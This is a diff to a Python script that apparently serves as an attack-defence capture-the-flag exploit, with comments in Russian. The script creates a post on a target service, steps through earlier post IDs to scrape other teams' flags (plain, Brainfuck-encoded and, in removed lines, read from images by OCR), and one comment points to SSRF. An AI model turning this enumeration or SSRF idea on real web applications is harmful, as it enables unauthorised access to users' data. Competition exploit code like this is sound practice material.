@@ -23,8 +23,7 @@ with requests.Session() as s:
     p = s.post('http://{}:5000/create-post'.format(ip), data = data, headers = headers)
     posts = re.findall('<a href="/post/(\d*)" class="btn btn-outline-secondary"> View post </a>', p.text)
     #
-    print(posts)
-    for i in range(int(posts[0])-10, int(posts[0])):
+    for i in range(int(posts[0])-15, int(posts[0])):
         p = s.get('http://{}:5000/post/{}'.format(ip, i))
         posts = re.findall('TEAM\d{3}_[A-Z0-9]{32}', p.text)
         print(posts) # Получили все флаги, хранящиеся в открытом виде
@@ -36,16 +35,5 @@ with requests.Session() as s:
             res = bfParser.evaluate(bf)
             print(res) # Получили флаги, хранящиеся в виде брейнфак кода
 
-        
+        # Картинки не видны, но можно запустить атаку через ssrf, зная название
         images = re.findall('src=" /image/(.*).png"', p.text)
-        for image in images:
-            p = s.get('http://{}:5000/image/{}.png'.format(ip, image))
-            if p.status_code == 200:
-                with open("321.png", 'wb') as f:
-                    f.write(p.content)
-            reader = easyocr.Reader(['en'])
-            result = reader.readtext('321.png', detail = 0)
-            result = ' '.join(result)
-            nums = re.findall(r'\d\d', result)
-            flag2 = ''.join((chr(int(c))) for c in nums)
-            print(flag2) # Получили флаги из картинок
